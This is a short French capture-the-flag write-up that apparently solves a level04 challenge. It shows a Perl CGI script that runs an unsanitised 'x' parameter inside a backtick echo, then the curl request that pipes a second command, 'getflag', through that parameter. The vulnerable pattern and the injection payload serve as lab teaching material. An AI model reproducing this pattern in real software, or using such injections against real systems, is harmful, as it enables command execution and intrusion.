1. ls renvoie un fichier perl creer par flag04
2. ce fichier a une faille puisque il permet d'executer n'importe quel code a la suite du echo
```
#!/usr/bin/perl
# localhost:4747
use CGI qw{param}; #import cgi, qui permet d'importer seulememt la fonction param
print "Content-type: text/html\n\n";
sub x {
  $y = $_[0];
  print `echo $y 2>&1`;
}
x(param("x"));
```
3. La commande ``curl 'localhost:4747/level04.pl?x=a|getflag'`` permet donc de recuperer le flag